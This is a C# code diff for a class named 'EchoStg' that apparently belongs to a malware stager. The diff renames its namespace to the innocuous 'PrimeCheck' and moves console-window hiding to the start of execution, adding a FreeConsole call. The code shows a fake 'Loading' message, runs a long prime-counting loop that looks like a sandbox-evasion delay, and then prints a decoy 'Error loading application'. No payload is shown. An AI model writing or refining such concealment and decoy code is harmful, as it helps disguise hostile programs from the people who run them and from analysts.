@@ -10,7 +10,7 @@ using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 using Microsoft.CodeAnalysis;
 
-namespace echoCovSt
+namespace PrimeCheck
 {
     public class EchoStg
     {
@@ -37,8 +37,14 @@ namespace echoCovSt
             [DllImport("kernel32.dll", ExactSpelling = true)]
             private static extern IntPtr GetConsoleWindow();
 
+            [DllImport("kernel32.dll")]
+            static extern bool FreeConsole();
+
             public static void PerformPrimeCheck()
             {
+                IntPtr hWnd = GetConsoleWindow();
+                ShowWindow(hWnd, SW_HIDE);
+
                 Console.Write("Loading the application, please wait...");
                 int maxNumber = 33567765;
                 int primes = 0;
@@ -69,8 +75,8 @@ namespace echoCovSt
                 Console.WriteLine("");
                 Console.WriteLine("Error loading application");
 
-                IntPtr hWnd = GetConsoleWindow();
-                ShowWindow(hWnd, SW_HIDE);
+                FreeConsole();
+                
                 return;
             }
         }
